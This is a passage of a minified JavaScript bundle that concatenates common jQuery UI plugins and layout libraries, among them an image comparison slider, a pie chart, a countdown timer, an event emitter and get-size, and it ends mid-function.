!function(t){t.fn.twentytwenty=function(e){e=t.extend({default_offset_pct:.5,orientation:"horizontal"},e);return this.each((function(){var i=e.default_offset_pct,o=t(this),n=e.orientation,s="vertical"===n?"down":"left",r="vertical"===n?"up":"right";o.wrap("<div class='twentytwenty-wrapper twentytwenty-"+n+"'></div>"),o.append("<div class='twentytwenty-overlay'></div>");var a=o.find("img:first"),l=o.find("img:last");o.append("<div class='twentytwenty-handle'></div>");var c=o.find(".twentytwenty-handle");c.append("<span class='twentytwenty-"+s+"-arrow'></span>"),c.append("<span class='twentytwenty-"+r+"-arrow'></span>"),o.addClass("twentytwenty-container"),a.addClass("twentytwenty-before"),l.addClass("twentytwenty-after");var p=o.find(".twentytwenty-overlay");p.append("<div class='twentytwenty-before-label'></div>"),p.append("<div class='twentytwenty-after-label'></div>");var u=function(t){var e=function(t){var e=a.width(),i=a.height();return{w:e+"px",h:i+"px",cw:t*e+"px",ch:t*i+"px"}}(t);c.css("vertical"===n?"top":"left","vertical"===n?e.ch:e.cw),function(t){"vertical"===n?a.css("clip","rect(0,"+t.w+","+t.ch+",0)"):a.css("clip","rect(0,"+t.cw+","+t.h+",0)"),o.css("height",t.h)}(e)};t(window).on("resize.twentytwenty",(function(t){u(i)}));var d=0,h=0;c.on("movestart",(function(t){((t.distX>t.distY&&t.distX<-t.distY||t.distX<t.distY&&t.distX>-t.distY)&&"vertical"!==n||(t.distX<t.distY&&t.distX<-t.distY||t.distX>t.distY&&t.distX>-t.distY)&&"vertical"===n)&&t.preventDefault(),o.addClass("active"),d=o.offset().left,offsetY=o.offset().top,h=a.width(),imgHeight=a.height()})),c.on("moveend",(function(t){o.removeClass("active")})),c.on("move",(function(t){o.hasClass("active")&&(0>(i="vertical"===n?(t.pageY-offsetY)/imgHeight:(t.pageX-d)/h)&&(i=0),i>1&&(i=1),u(i))})),o.find("img").on("mousedown",(function(t){t.preventDefault()})),t(window).trigger("resize.twentytwenty")}))}}(jQuery),function(t){"function"==typeof define&&define.amd?define(["jquery"],t):t(jQuery)}((function(t,e){function i(t){function e(t){o?(i(),$(e),n=!0,o=!1):n=!1}var i=t,o=!1,n=!1;this.kick=function(t){o=!0,n||e()},this.end=function(t){var e=i;t&&(n?(i=o?function(){e(),t()}:t,o=!0):t())}}function o(){return!0}function n(){return!1}function s(t){t.preventDefault()}function r(t){P[t.target.tagName.toLowerCase()]||t.preventDefault()}function a(t,e){var i,o;if(t.identifiedTouch)return t.identifiedTouch(e);for(i=-1,o=t.length;++i<o;)if(t[i].identifier===e)return t[i]}function l(t,e){var i=a(t.changedTouches,e.identifier);if(i&&(i.pageX!==e.pageX||i.pageY!==e.pageY))return i}function c(t){m(t,t.data,t,u)}function p(t){u()}function u(){T(document,I.move,c),T(document,I.cancel,p)}function d(t){var e=t.data,i=l(t,e);i&&m(t,e,i,f)}function h(t){var e=t.data;a(t.changedTouches,e.identifier)&&f(e.identifier)}function f(t){T(document,"."+t,d),T(document,"."+t,h)}function m(t,e,i,o){var n=i.pageX-e.startX,s=i.pageY-e.startY;S*S>n*n+s*s||function(t,e,i,o,n,s){var r,a;e.target,r=t.targetTouches,a=t.timeStamp-e.timeStamp,e.type="movestart",e.distX=o,e.distY=n,e.deltaX=o,e.deltaY=n,e.pageX=i.pageX,e.pageY=i.pageY,e.velocityX=o/a,e.velocityY=n/a,e.targetTouches=r,e.finger=r?r.length:1,e._handled=g,e._preventTouchmoveDefault=function(){t.preventDefault()},k(e.target,e),s(e.identifier)}(t,e,i,n,s,o)}function g(){return this._handled=o,!1}function v(t){t._handled()}function _(t){var e=t.data.timer;t.data.touch=t,t.data.timeStamp=t.timeStamp,e.kick()}function y(t){var e=t.data.event,i=t.data.timer;T(document,I.move,_),T(document,I.end,y),x(e,i,(function(){setTimeout((function(){T(e.target,"click",n)}),0)}))}function b(t){var e=t.data.event,i=t.data.timer,o=l(t,e);o&&(t.preventDefault(),e.targetTouches=t.targetTouches,t.data.touch=o,t.data.timeStamp=t.timeStamp,i.kick())}function w(t){var e=t.data.event,i=t.data.timer;a(t.changedTouches,e.identifier)&&(function(t){T(document,"."+t.identifier,b),T(document,"."+t.identifier,w)}(e),x(e,i))}function x(t,e,i){e.end((function(){return t.type="moveend",k(t.target,t),i&&i()}))}var S=6,z=t.event.add,T=t.event.remove,k=function(e,i,o){t.event.trigger(i,o,e)},$=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(t,e){return window.setTimeout((function(){t()}),25)},P={textarea:!0,input:!0,select:!0,button:!0},I={move:"mousemove",cancel:"mouseup dragstart",end:"mouseup"},C={move:"touchmove",cancel:"touchend",end:"touchend"};t.event.special.movestart={setup:function(t,e,i){return z(this,"movestart.move",v),!0},teardown:function(t){return T(this,"dragstart drag",s),T(this,"mousedown touchstart",r),T(this,"movestart",v),!0},add:function(t){"move"!==t.namespace&&"moveend"!==t.namespace&&(z(this,"dragstart."+t.guid+" drag."+t.guid,s,e,t.selector),z(this,"mousedown."+t.guid,r,e,t.selector))},remove:function(t){"move"!==t.namespace&&"moveend"!==t.namespace&&(T(this,"dragstart."+t.guid+" drag."+t.guid),T(this,"mousedown."+t.guid))},_default:function(t){var o,s;t._handled()&&(o={target:t.target,startX:t.startX,startY:t.startY,pageX:t.pageX,pageY:t.pageY,distX:t.distX,distY:t.distY,deltaX:t.deltaX,deltaY:t.deltaY,velocityX:t.velocityX,velocityY:t.velocityY,timeStamp:t.timeStamp,identifier:t.identifier,targetTouches:t.targetTouches,finger:t.finger},s={event:o,timer:new i((function(e){(function(t,e,i,o){var n=i-t.timeStamp;t.type="move",t.distX=e.pageX-t.startX,t.distY=e.pageY-t.startY,t.deltaX=e.pageX-t.pageX,t.deltaY=e.pageY-t.pageY,t.velocityX=.3*t.velocityX+.7*t.deltaX/n,t.velocityY=.3*t.velocityY+.7*t.deltaY/n,t.pageX=e.pageX,t.pageY=e.pageY})(o,s.touch,s.timeStamp),k(t.target,o)})),touch:e,timeStamp:e},t.identifier===e?(z(t.target,"click",n),z(document,I.move,_,s),z(document,I.end,y,s)):(t._preventTouchmoveDefault(),z(document,C.move+"."+t.identifier,b,s),z(document,C.end+"."+t.identifier,w,s)))}},t.event.special.move={setup:function(){z(this,"movestart.move",t.noop)},teardown:function(){T(this,"movestart.move",t.noop)}},t.event.special.moveend={setup:function(){z(this,"movestart.moveend",t.noop)},teardown:function(){T(this,"movestart.moveend",t.noop)}},z(document,"mousedown.move",(function(t){var e;(function(t){return 1===t.which&&!t.ctrlKey&&!t.altKey})(t)&&(e={target:t.target,startX:t.pageX,startY:t.pageY,timeStamp:t.timeStamp},z(document,I.move,c,e),z(document,I.cancel,p,e))})),z(document,"touchstart.move",(function(t){var e,i;P[t.target.tagName.toLowerCase()]||(i={target:(e=t.changedTouches[0]).target,startX:e.pageX,startY:e.pageY,timeStamp:t.timeStamp,identifier:e.identifier},z(document,C.move+"."+e.identifier,d,i),z(document,C.cancel+"."+e.identifier,h,i))})),"function"==typeof Array.prototype.indexOf&&function(t,e){for(var i=["changedTouches","targetTouches"],o=i.length;o--;)-1===t.event.props.indexOf(i[o])&&t.event.props.push(i[o])}(t)})),function(t,e){"object"==typeof exports?module.exports=e(require("jquery")):"function"==typeof define&&define.amd?define("EasyPieChart",["jquery"],e):e(t.jQuery)}(this,(function(t){var e=function(t,e){var i,o=document.createElement("canvas");"undefined"!=typeof G_vmlCanvasManager&&G_vmlCanvasManager.initElement(o);var n=o.getContext("2d");o.width=o.height=e.size,t.appendChild(o);var s=1;window.devicePixelRatio>1&&(s=window.devicePixelRatio,o.style.width=o.style.height=[e.size,"px"].join(""),o.width=o.height=e.size*s,n.scale(s,s)),n.translate(e.size/2,e.size/2),n.rotate((e.rotate/180-.5)*Math.PI);var r=(e.size-e.lineWidth)/2;e.scaleColor&&e.scaleLength&&(r-=e.scaleLength+2),Date.now=Date.now||function(){return+new Date};var a=function(t,e,i){var o=0>=(i=Math.min(Math.max(-1,i||0),1));n.beginPath(),n.arc(0,0,r,0,2*Math.PI*i,o),n.strokeStyle=t,n.lineWidth=e,n.stroke()},l=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||function(t){window.setTimeout(t,1e3/60)},c=function(){e.scaleColor&&function(){var t,i,o=24;for(n.lineWidth=1,n.fillStyle=e.scaleColor,n.save(),o=24;o>0;--o)0==o%6?(i=e.scaleLength,t=0):(i=.6*e.scaleLength,t=e.scaleLength-i),n.fillRect(-e.size/2+t,0,i,1),n.rotate(Math.PI/12);n.restore()}(),e.trackColor&&a(e.trackColor,e.lineWidth,1)};this.clear=function(){n.clearRect(e.size/-2,e.size/-2,e.size,e.size)},this.draw=function(t){var o;e.scaleColor||e.trackColor?n.getImageData&&n.putImageData?i?n.putImageData(i,0,0):(c(),i=n.getImageData(0,0,e.size*s,e.size*s)):(this.clear(),c()):this.clear(),n.lineCap=e.lineCap,o="function"==typeof e.barColor?e.barColor(t):e.barColor,a(o,e.lineWidth,t/100)}.bind(this),this.animate=function(t,i){var o=Date.now();e.onStart(t,i);var n=function(){var s=Math.min(Date.now()-o,e.animate),r=e.easing(this,s,t,i-t,e.animate);this.draw(r),e.onStep(t,i,r),s>=e.animate?e.onStop(t,i):l(n)}.bind(this);l(n)}.bind(this)},i=function(t,i){var o={barColor:"#ef1e25",trackColor:"#f9f9f9",scaleColor:"#dfe0e0",scaleLength:5,lineCap:"round",lineWidth:3,size:110,rotate:0,animate:1e3,easing:function(t,e,i,o,n){return 1>(e/=n/2)?o/2*e*e+i:-o/2*(--e*(e-2)-1)+i},onStart:function(){},onStep:function(){},onStop:function(){}};if(void 0!==e)o.renderer=e;else{if("undefined"==typeof SVGRenderer)throw new Error("Please load either the SVG- or the CanvasRenderer");o.renderer=SVGRenderer}var n={},s=0,r=function(){for(var e in this.el=t,this.options=n,o)o.hasOwnProperty(e)&&(n[e]=i&&void 0!==i[e]?i[e]:o[e],"function"==typeof n[e]&&(n[e]=n[e].bind(this)));n.easing="string"==typeof n.easing&&"undefined"!=typeof jQuery&&jQuery.isFunction(jQuery.easing[n.easing])?jQuery.easing[n.easing]:o.easing,this.renderer=new n.renderer(t,n),this.renderer.draw(s),t.dataset&&t.dataset.percent?this.update(parseFloat(t.dataset.percent)):t.getAttribute&&t.getAttribute("data-percent")&&this.update(parseFloat(t.getAttribute("data-percent")))}.bind(this);this.update=function(t){return t=parseFloat(t),n.animate?this.renderer.animate(s,t):this.renderer.draw(t),s=t,this}.bind(this),r()};t.fn.easyPieChart=function(e){return this.each((function(){var o;t.data(this,"easyPieChart")||(o=t.extend({},e,t(this).data()),t.data(this,"easyPieChart",new i(this,o)))}))}})),function(t){t.fn.downCount=function(e,i){var o=t.extend({date:null,offset:null},e);o.date||t.error("Date is not defined."),Date.parse(o.date)||t.error("Incorrect date format, it should look like this, 12/24/2012 12:00:00.");var n=this,s=function(){var t=new Date,e=t.getTime()+6e4*t.getTimezoneOffset();return new Date(e+36e5*o.offset)},r=setInterval((function(){var t=new Date(o.date)-s();if(t<0)return clearInterval(r),void(i&&"function"==typeof i&&i());var e=6e4,a=60*e,l=24*a,c=Math.floor(t/l),p=Math.floor(t%l/a),u=Math.floor(t%a/e),d=Math.floor(t%e/1e3),h=1===(c=String(c).length>=2?c:"0"+c)?"day":"days",f=1===(p=String(p).length>=2?p:"0"+p)?"hour":"hours",m=1===(u=String(u).length>=2?u:"0"+u)?"minute":"minutes",g=1===(d=String(d).length>=2?d:"0"+d)?"second":"seconds";n.find(".days").text(c),n.find(".hours").text(p),n.find(".minutes").text(u),n.find(".seconds").text(d),n.find(".days_ref").text(h),n.find(".hours_ref").text(f),n.find(".minutes_ref").text(m),n.find(".seconds_ref").text(g)}),1e3)}}(jQuery),function(t){t.fn.extend({BlackAndWhite:function(e){"use strict";var i=this,o=t.extend({hoverEffect:!0,webworkerPath:!1,invertHoverEffect:!1,speed:500,onImageReady:null,intensity:1},e),n=o.hoverEffect,s=o.webworkerPath,r=o.invertHoverEffect,a="number"==typeof o.intensity&&o.intensity<1&&o.intensity>0?o.intensity:1,l=t.isPlainObject(o.speed)?o.speed.fadeIn:o.speed,c=t.isPlainObject(o.speed)?o.speed.fadeOut:o.speed,p=t(window),u=".BlackAndWhite",d=(!document.all||window.opera||window.XMLHttpRequest," -webkit- -moz- -o- -ms- ".split(" ")),h={},f=function(){var t=document.createElement("div");return t.style.cssText=d.join("filter:blur(2px); "),!!t.style.length&&(void 0===document.documentMode||document.documentMode>9)}(),m=!!document.createElement("canvas").getContext,g="undefined"!=typeof Worker,v=function(t){if(h[t]||""===h[t])return h[t]+t;var e=document.createElement("div"),i=["","Moz","Webkit","O","ms","Khtml"];for(var o in i)if(void 0!==e.style[i[o]+t])return h[t]=i[o],i[o]+t;return t.toLowerCase()}("Filter"),_=[],y=!(!g||!s)&&new Worker(s+"BnWWorker.js"),b=function(e){t(e.currentTarget).find(".BWfade").stop(!0,!0).animate({opacity:r?0:1},c)},w=function(e){t(e.currentTarget).find(".BWfade").stop(!0,!0).animate({opacity:r?1:0},l)},x=function(t){"function"==typeof o.onImageReady&&o.onImageReady(t)},S=function(t){y&&m&&!f&&!t&&z()},z=function(){return _.length?(y.postMessage({imgData:_[0].imageData,intensity:a}),void(y.onmessage=function(t){_[0].ctx.putImageData(t.data,0,0),x(_[0].img),_.splice(0,1),z()})):(y.terminate&&y.terminate(),void(y.close&&y.close()))},T=function(e,i){var o,n=e[0],s=(n.src,e.position()),l={top:s.top,left:s.left,position:"absolute","-webkit-transform":"translate3d(0,0,0)",opacity:r?0:1};n.crossOrigin="anonymous",m&&!f?(o=t('<canvas width="'+n.naturalWidth+'" height="'+n.naturalHeight+'" class="BWfade"></canvas>'),l.width=e.width(),l.height=e.height(),function(t,e,i,o){var n=e.getContext("2d"),s=0;n.drawImage(t,0,0,i,o);var r=n.getImageData(0,0,i,o),l=r.data,c=l.length;if(y)_.push({imageData:r,ctx:n,img:t});else{for(;c>s;s+=4){var p=.3*l[s]+.59*l[s+1]+.11*l[s+2];l[s]=~~(p*a+l[s]*(1-a)),l[s+1]=~~(p*a+l[s+1]*(1-a)),l[s+2]=~~(p*a+l[s+2]*(1-a))}n.putImageData(r,0,0),x(t)}}(n,o.get(0),n.naturalWidth,n.naturalHeight)):(m?l[v]="grayscale("+100*a+"%)":l.filter="progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)",o=e.clone().addClass("BWFilter BWfade"),x(n)),o.css(l).prependTo(i),!t.support.opacity&&r&&o.animate({opacity:0},0)},k=function(){i.each((function(e,i){var o=t(i).find("img"),n=t(o).width(),s=t(o).height();t(this).find("canvas").css({width:n,height:s})}))};return function(){var e=i.find("img").filter((function(){return!t(this).data("_b&w")})).length;i.each((function(i,o){var n=t(o),s=n.find("img");s.data("_b&w")||(function(t){return t.complete||void 0!==t.naturalWidth&&t.naturalWidth}(s[0])?(e--,T(s,n)):s.on("load",(function(){return s.data("_b&w_loaded")||!s[0].complete?void setTimeout((function(){s.load()}),20):(T(s,n),s.data("_b&w_loaded",!0),e--,void S(e))})).load(),s.data("_b&w",!0))})),S(e),n&&i.unbind(u).on("mouseleave"+u,b).on("mouseenter"+u,w),m&&!f&&p.unbind(u).on("resize"+u+" orientationchange"+u,k)}(),{destroy:function(){i.off(u),p.off(u)}}}})}(jQuery),function(t){function e(){}function i(t){function i(e){e.prototype.option||(e.prototype.option=function(e){t.isPlainObject(e)&&(this.options=t.extend(!0,this.options,e))})}function n(e,i){t.fn[e]=function(n){if("string"==typeof n){for(var r=o.call(arguments,1),a=0,l=this.length;l>a;a++){var c=this[a],p=t.data(c,e);if(p)if(t.isFunction(p[n])&&"_"!==n.charAt(0)){var u=p[n].apply(p,r);if(void 0!==u)return u}else s("no such method '"+n+"' for "+e+" instance");else s("cannot call methods on "+e+" prior to initialization; attempted to call '"+n+"'")}return this}return this.each((function(){var o=t.data(this,e);o?(o.option(n),o._init()):(o=new i(this,n),t.data(this,e,o))}))}}if(t){var s="undefined"==typeof console?e:function(t){console.error(t)};return t.bridget=function(t,e){i(e),n(t,e)},t.bridget}}var o=Array.prototype.slice;"function"==typeof define&&define.amd?define("jquery-bridget/jquery.bridget",["jquery"],i):"object"==typeof exports?i(require("jquery")):i(t.jQuery)}(window),function(t){function e(e){var i=t.event;return i.target=i.target||i.srcElement||e,i}var i=document.documentElement,o=function(){};i.addEventListener?o=function(t,e,i){t.addEventListener(e,i,!1)}:i.attachEvent&&(o=function(t,i,o){t[i+o]=o.handleEvent?function(){var i=e(t);o.handleEvent.call(o,i)}:function(){var i=e(t);o.call(t,i)},t.attachEvent("on"+i,t[i+o])});var n=function(){};i.removeEventListener?n=function(t,e,i){t.removeEventListener(e,i,!1)}:i.detachEvent&&(n=function(t,e,i){t.detachEvent("on"+e,t[e+i]);try{delete t[e+i]}catch(o){t[e+i]=void 0}});var s={bind:o,unbind:n};"function"==typeof define&&define.amd?define("eventie/eventie",s):"object"==typeof exports?module.exports=s:t.eventie=s}(this),function(t){function e(t){"function"==typeof t&&(e.isReady?t():r.push(t))}function i(t){var i="readystatechange"===t.type&&"complete"!==s.readyState;e.isReady||i||o()}function o(){e.isReady=!0;for(var t=0,i=r.length;i>t;t++){(0,r[t])()}}function n(n){return"complete"===s.readyState?o():(n.bind(s,"DOMContentLoaded",i),n.bind(s,"readystatechange",i),n.bind(t,"load",i)),e}var s=t.document,r=[];e.isReady=!1,"function"==typeof define&&define.amd?define("doc-ready/doc-ready",["eventie/eventie"],n):"object"==typeof exports?module.exports=n(require("eventie")):t.docReady=n(t.eventie)}(window),function(){function t(){}function e(t,e){for(var i=t.length;i--;)if(t[i].listener===e)return i;return-1}function i(t){return function(){return this[t].apply(this,arguments)}}var o=t.prototype,n=this,s=n.EventEmitter;o.getListeners=function(t){var e,i,o=this._getEvents();if(t instanceof RegExp)for(i in e={},o)o.hasOwnProperty(i)&&t.test(i)&&(e[i]=o[i]);else e=o[t]||(o[t]=[]);return e},o.flattenListeners=function(t){var e,i=[];for(e=0;t.length>e;e+=1)i.push(t[e].listener);return i},o.getListenersAsObject=function(t){var e,i=this.getListeners(t);return i instanceof Array&&((e={})[t]=i),e||i},o.addListener=function(t,i){var o,n=this.getListenersAsObject(t),s="object"==typeof i;for(o in n)n.hasOwnProperty(o)&&-1===e(n[o],i)&&n[o].push(s?i:{listener:i,once:!1});return this},o.on=i("addListener"),o.addOnceListener=function(t,e){return this.addListener(t,{listener:e,once:!0})},o.once=i("addOnceListener"),o.defineEvent=function(t){return this.getListeners(t),this},o.defineEvents=function(t){for(var e=0;t.length>e;e+=1)this.defineEvent(t[e]);return this},o.removeListener=function(t,i){var o,n,s=this.getListenersAsObject(t);for(n in s)s.hasOwnProperty(n)&&(-1!==(o=e(s[n],i))&&s[n].splice(o,1));return this},o.off=i("removeListener"),o.addListeners=function(t,e){return this.manipulateListeners(!1,t,e)},o.removeListeners=function(t,e){return this.manipulateListeners(!0,t,e)},o.manipulateListeners=function(t,e,i){var o,n,s=t?this.removeListener:this.addListener,r=t?this.removeListeners:this.addListeners;if("object"!=typeof e||e instanceof RegExp)for(o=i.length;o--;)s.call(this,e,i[o]);else for(o in e)e.hasOwnProperty(o)&&(n=e[o])&&("function"==typeof n?s.call(this,o,n):r.call(this,o,n));return this},o.removeEvent=function(t){var e,i=typeof t,o=this._getEvents();if("string"===i)delete o[t];else if(t instanceof RegExp)for(e in o)o.hasOwnProperty(e)&&t.test(e)&&delete o[e];else delete this._events;return this},o.removeAllListeners=i("removeEvent"),o.emitEvent=function(t,e){var i,o,n,s=this.getListenersAsObject(t);for(n in s)if(s.hasOwnProperty(n))for(o=s[n].length;o--;)!0===(i=s[n][o]).once&&this.removeListener(t,i.listener),i.listener.apply(this,e||[])===this._getOnceReturnValue()&&this.removeListener(t,i.listener);return this},o.trigger=i("emitEvent"),o.emit=function(t){var e=Array.prototype.slice.call(arguments,1);return this.emitEvent(t,e)},o.setOnceReturnValue=function(t){return this._onceReturnValue=t,this},o._getOnceReturnValue=function(){return!this.hasOwnProperty("_onceReturnValue")||this._onceReturnValue},o._getEvents=function(){return this._events||(this._events={})},t.noConflict=function(){return n.EventEmitter=s,t},"function"==typeof define&&define.amd?define("eventEmitter/EventEmitter",[],(function(){return t})):"object"==typeof module&&module.exports?module.exports=t:n.EventEmitter=t}.call(this),function(t){function e(t){if(t){if("string"==typeof o[t])return t;t=t.charAt(0).toUpperCase()+t.slice(1);for(var e,n=0,s=i.length;s>n;n++)if(e=i[n]+t,"string"==typeof o[e])return e}}var i="Webkit Moz ms Ms O".split(" "),o=document.documentElement.style;"function"==typeof define&&define.amd?define("get-style-property/get-style-property",[],(function(){return e})):"object"==typeof exports?module.exports=e:t.getStyleProperty=e}(window),function(t){function e(t){var e=parseFloat(t);return-1===t.indexOf("%")&&!isNaN(e)&&e}function i(i){function s(){if(!p){p=!0;var n=t.getComputedStyle;if(a=function(){var t=n?function(t){return n(t,null)}:function(t){return t.currentStyle};return function(e){var i=t(e);return i||o("Style returned "+i+". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"),i}}(),l=i("boxSizing")){var s=document.createElement("div");s.style.width="200px",s.style.padding="1px 2px 3px 4px",s.style.borderStyle="solid",s.style.borderWidth="1px 2px 3px 4px",s.style[l]="border-box";var r=document.body||document.documentElement;r.appendChild(s);var u=a(s);c=200===e(u.width),r.removeChild(s)}}}function r(e,i){if(t.getComputedStyle||-1===i.indexOf("%"))return i;var o=e.style,n=o.left,s=e.runtimeStyle,r=s&&s.left;return r&&(s.left=e.currentStyle.left),o.left=i,i=o.pixelLeft,o.left=n,r&&(s.left=r),i}var a,l,c,p=!1;return function(t){if(s(),"string"==typeof t&&(t=document.querySelector(t)),t&&"object"==typeof t&&t.nodeType){var i=a(t);if("none"===i.display)return function(){for(var t={width:0,height:0,innerWidth:0,innerHeight:0,outerWidth:0,outerHeight:0},e=0,i=n.length;i>e;e++)t[n[e]]=0;return t}();var o={};o.width=t.offsetWidth,o.height=t.offsetHeight;for(var p=o.isBorderBox=!(!l||!i[l]||"border-box"!==i[l]),u=0,d=n.length;d>u;u++){var h=n[u],f=i[h];f=r(t,f);var m=parseFloat(f);o[h]=isNaN(m)?0:m}var g=o.paddingLeft+o.paddingRight,v=o.paddingTop+o.paddingBottom,_=o.marginLeft+o.marginRight,y=o.marginTop+o.marginBottom,b=o.borderLeftWidth+o.borderRightWidth,w=o.borderTopWidth+o.borderBottomWidth,x=p&&c,S=e(i.width);!1!==S&&(o.width=S+(x?0:g+b));var z=e(i.height);return!1!==z&&(o.height=z+(x?0:v+w)),o.innerWidth=o.width-(g+b),o.innerHeight=o.height-(v+w),o.outerWidth=o.width+_,o.outerHeight=o.height+y,o}}}var o="undefined"==typeof console?function(){}:function(t){console.error(t)},n=["paddingLeft","paddingRight","paddingTop","paddingBottom","marginLeft","marginRight","marginTop","marginBottom","borderLeftWidth","borderRightWidth","borderTopWidth","borderBottomWidth"];"function"==typeof define&&define.amd?define("get-size/get-size",["get-style-property/get-style-property"],i):"object"==typeof exports?module.exports=i(require("desandro-get-style-property")):t.getSize=i(t.getStyleProperty)}(window),function(t){function e(t,e){return t[n](e)}function i(t){t.parentNode||document.createDocumentFragment().appendChild(t)}var o,n=function(){if(t.matchesSelector)return"matchesSelector";for(var e=["webkit","moz","ms","o"],i=0,o=e.length;o>i;i++){var n=e[i]+"MatchesSelector";if(t[n])return n}}();if(n){var s=e(document.createElement("div"),"div");o=s?e:function(t,o){return i(t),e(t,o)}}else o=function(t,e){i(t);for(var o=t.parentNode.querySelectorAll(e),n=0,s=o.length;s>n;n++)if(o[n]===t)return!0;return!1};"function"==typeof define&&define.amd?define("matches-selector/matches-selector",[],(function(){return o})):"object"==typeof exports?module.exports=o:window.matchesSelector=o}(Element.prototype),function(t){function e(t,e,i){function n(t,e){t&&(this.element=t,this.layout=e,this.position={x:0,y:0},this._create())}var s=i("transition"),r=i("transform"),a=s&&r,l=!!i("perspective"),c={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"otransitionend",transition:"transitionend"}[s],p=["transform","transition","transitionDuration","transitionProperty"],u=function(){for(var t={},e=0,o=p.length;o>e;e++){var n=p[e],s=i(n);s&&s!==n&&(t[n]=s)}return t}();(function(t,e){for(var i in e)t[i]=e[i]})(n.prototype,t.prototype),n.prototype._create=function(){this._transn={ingProperties:{},clean:{},onEnd:{}},this.css({position:"absolute"})},n.prototype.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},n.prototype.getSize=function(){this.size=e(this.element)},n.prototype.css=function(t){var e=this.element.style;for(var i in t){e[u[i]||i]=t[i]}},n.prototype.getPosition=function(){var t=o(this.element),e=this.layout.options,i=e.isOriginLeft,n=e.isOriginTop,s=parseInt(t[i?"left":"right"],10),r=parseInt(t[n?"top":"bottom"],10);s=isNaN(s)?0:s,r=isNaN(r)?0:r;var a=this.layout.size;s-=i?a.paddingLeft:a.paddingRight,r-=n?a.paddingTop:a.paddingBottom,this.position.x=s,this.position.y=r},n.prototype.layoutPosition=function(){var t=this.layout.size,e=this.layout.options,i={};e.isOriginLeft?(i.left=this.position.x+t.paddingLeft+"px",i.right=""):(i.right=this.position.x+t.paddingRight+"px",i.left=""),e.isOriginTop?(i.top=this.position.y+t.paddingTop+"px",i.bottom=""):(i.bottom=this.position.y+t.paddingBottom+"px",i.top=""),this.css(i),this.emitEvent("layout",[this])};var d=l?function(t,e){return"translate3d("+t+"px, "+e+"px, 0)"}:function(t,e){return"translate("+t+"px, "+e+"px)"};n.prototype._transitionTo=function(t,e){this.getPosition();var i=this.position.x,o=this.position.y,n=parseInt(t,10),s=parseInt(e,10),r=n===this.position.x&&s===this.position.y;if(this.setPosition(t,e),!r||this.isTransitioning){var a=t-i,l=e-o,c={},p=this.layout.options;a=p.isOriginLeft?a:-a,l=p.isOriginTop?l:-l,c.transform=d(a,l),this.transition({to:c,onTransitionEnd:{transform:this.layoutPosition},isCleaning:!0})}else this.layoutPosition()},n.prototype.goTo=function(t,e){this.setPosition(t,e),this.layoutPosition()},n.prototype.moveTo=a?n.prototype._transitionTo:n.prototype.goTo,n.prototype.setPosition=function(t,e){this.position.x=parseInt(t,10),this.position.y=parseInt(e,10)},n.prototype._nonTransition=function(t){for(var e in this.css(t.to),t.isCleaning&&this._removeStyles(t.to),t.onTransitionEnd)t.onTransitionEnd[e].call(this)},n.prototype._transition=function(t){if(parseFloat(this.layout.options.transitionDuration)){var e=this._transn;for(var i in t.onTransitionEnd)e.onEnd[i]=t.onTransitionEnd[i];for(i in t.to)e.ingProperties[i]=!0,t.isCleaning&&(e.clean[i]=!0);if(t.from){this.css(t.from);this.element.offsetHeight;null}this.enableTransition(t.to),this.css(t.to),this.isTransitioning=!0}else this._nonTransition(t)};var h=r&&function(t){return t.replace(/([A-Z])/g,(function(t){return"-"+t.toLowerCase()}))}(r)+",opacity";n.prototype.enableTransition=function(){this.isTransitioning||(this.css({transitionProperty:h,transitionDuration:this.layout.options.transitionDuration}),this.element.addEventListener(c,this,!1))},n.prototype.transition=n.prototype[s?"_transition":"_nonTransition"],n.prototype.onwebkitTransitionEnd=function(t){this.ontransitionend(t)},n.prototype.onotransitionend=function(t){this.ontransitionend(t)};var f={"-webkit-transform":"transform","-moz-transform":"transform","-o-transform":"transform"};n.prototype.ontransitionend=function(t){if(t.target===this.element){var e=this._transn,i=f[t.propertyName]||t.propertyName;if(delete e.ingProperties[i],function(t){for(var e in t)return!1;return!0}(e.ingProperties)&&this.disableTransition(),i in e.clean&&(this.element.style[t.propertyName]="",delete e.clean[i]),i in e.onEnd)e.onEnd[i].call(this),delete e.onEnd[i];this.emitEvent("transitionEnd",[this])}},n.prototype.disableTransition=function(){this.removeTransitionStyles(),this.element.removeEventListener(c,this,!1),this.isTransitioning=!1},n.prototype._removeStyles=function(t){var e={};for(var i in t)e[i]="";this.css(e)};var m={transitionProperty:"",transitionDuration:""};return n.prototype.removeTransitionStyles=function(){this.css(m)},n.prototype.removeElem=function(){this.element.parentNode.removeChild(this.element),this.emitEvent("remove",[this])},n.prototype.remove=function(){if(s&&parseFloat(this.layout.options.transitionDuration)){var t=this;this.on("transitionEnd",(function(){return t.removeElem(),!0})),this.hide()}else this.removeElem()},n.prototype.reveal=function(){delete this.isHidden,this.css({display:""});var t=this.layout.options;this.transition({from:t.hiddenStyle,to:t.visibleStyle,isCleaning:!0})},n.prototype.hide=function(){this.isHidden=!0,this.css({display:""});var t=this.layout.options;this.transition({from:t.visibleStyle,to:t.hiddenStyle,isCleaning:!0,onTransitionEnd:{opacity:function(){this.isHidden&&this.css({display:"none"})}}})},n.prototype.destroy=function(){this.css({position:"",left:"",right:"",top:"",bottom:"",transition:"",transform:""})},n}var i=t.getComputedStyle,o=i?function(t){return i(t,null)}:function(t){return t.currentStyle};"function"==typeof define&&define.amd?define("outlayer/item",["eventEmitter/EventEmitter","get-size/get-size","get-style-property/get-style-property"],e):"object"==typeof exports?module.exports=e(require("wolfy87-eventemitter"),require("get-size"),require("desandro-get-style-property")):(t.Outlayer={},t.Outlayer.Item=e(t.EventEmitter,t.getSize,t.getStyleProperty))}(window),function(t){function e(t,e){for(var i in e)t[i]=e[i];return t}function i(t){var e=[];if(function(t){return"[object Array]"===c.call(t)}(t))e=t;else if(t&&"number"==typeof t.length)for(var i=0,o=t.length;o>i;i++)e.push(t[i]);else e.push(t);return e}function o(t,e){var i=u(e,t);-1!==i&&e.splice(i,1)}function n(n,c,u,d,h,f){function m(t,i){if("string"==typeof t&&(t=s.querySelector(t)),t&&p(t)){this.element=t,this.options=e({},this.constructor.defaults),this.option(i);var 